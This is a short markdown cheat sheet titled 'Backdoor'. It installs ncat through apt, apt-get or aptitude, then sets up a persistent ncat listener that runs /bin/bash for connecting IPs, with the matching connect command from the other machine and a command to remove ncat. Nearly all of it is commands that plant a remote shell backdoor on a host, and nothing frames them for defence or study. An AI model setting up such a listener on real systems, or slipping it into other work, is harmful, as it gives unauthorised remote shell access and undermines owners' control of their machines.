# Backdoor 
## Install ncat on the local box
### Apt-get (Install)
'sudo apt-get update'
'sudo apt-get -y install ncat'

### Apt (Install)
'sudo apt update'
'sudo apt -y install ncat'

### Aptitude (Install)
'sudo aptitude update'
'sudo aptitude -y install ncat'

## Local box that will be backdoored into 
'ncat -k -nvlp <port> -e "/bin/bash" --allow <ips go here>'

## Box that will backdoor into local machine 
'ncat -nv <ip address of local box> <port>'



### If ncat needs to be deleated
'sudo apt-get -y autoremove --purge ncat'

